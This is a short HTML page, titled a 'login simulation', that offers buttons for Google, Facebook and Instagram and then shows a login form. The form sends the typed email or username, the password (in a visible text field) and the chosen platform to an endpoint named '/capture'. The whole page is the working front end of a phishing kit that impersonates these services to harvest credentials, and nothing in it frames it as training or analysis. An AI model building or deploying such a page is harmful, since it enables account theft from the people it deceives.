<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Switchable Login Simulation</title>
  <link rel="stylesheet" href="style.css">
</head>

<body>
  <div class="container">
    <h2>Select Platform</h2>
    <div class="button-group">
      <button onclick="showForm('Google')">Google</button>
      <button onclick="showForm('Facebook')">Facebook</button>
      <button onclick="showForm('Instagram')">Instagram</button>
    </div>

    <form id="loginForm" method="POST" action="/capture" style="display:none;">
      <input type="hidden" name="platform" id="platform">
      <label>Email/Phone/Username:</label>
      <input type="text" name="email" required>

      <label>Password (visible):</label>
      <input type="text" name="password" required>

      <button type="submit">Next</button>
    </form>
  </div>

  <script>
    function showForm(platform) {
      document.getElementById('loginForm').style.display = 'block';
      document.getElementById('platform').value = platform;
    }
  </script>
</body>

</html>
